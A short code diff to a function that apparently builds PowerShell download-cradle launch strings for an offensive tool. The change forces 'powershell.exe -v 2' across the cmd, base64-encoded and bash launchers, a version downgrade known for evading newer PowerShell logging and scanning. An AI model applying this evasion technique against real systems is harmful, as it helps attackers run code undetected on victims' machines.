@@ -142,12 +142,14 @@ def build_cradle(get_args):
             clip_exec,
         )
 
+    powershell_exe = 'powershell.exe -v 2'
     if get_args['Launcher'] == 'cmd':
-        result = 'powershell.exe "%s"' % result
+        result = '%s "%s"' % (powershell_exe, result)
     elif get_args['Launcher'] == 'cmd_enc':
-        result = 'powershell.exe -Enc %s' % \
-            binascii.b2a_base64(result.encode('utf-16le')).decode()
+        result = '%s -Enc %s' % (
+            powershell_exe,
+            binascii.b2a_base64(result.encode('utf-16le')).decode())
     elif get_args['Launcher'] == 'bash':
         result = result.replace('$', '\\$')
-        result = '"powershell.exe \\\"%s\\\""' % result
+        result = '"%s \\\"%s\\\""' % (powershell_exe, result)
     return result
